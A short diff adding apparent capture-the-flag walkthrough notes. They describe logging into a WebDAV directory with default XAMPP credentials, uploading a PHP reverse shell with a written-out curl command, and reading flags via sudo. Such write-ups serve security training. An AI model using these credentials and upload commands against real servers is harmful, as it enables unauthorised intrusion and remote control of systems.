@@ -1,0 +1,13 @@
+Web server running on port 80
+
+Found directory /webdav
+
+Login with default credentials:
+
+wampp:xampp
+
+Upload php reverse shell with curl
+
+curl -u wampp:xampp -T shell.php http://<IP>/webdav/
+
+Use sudo cat to get flags
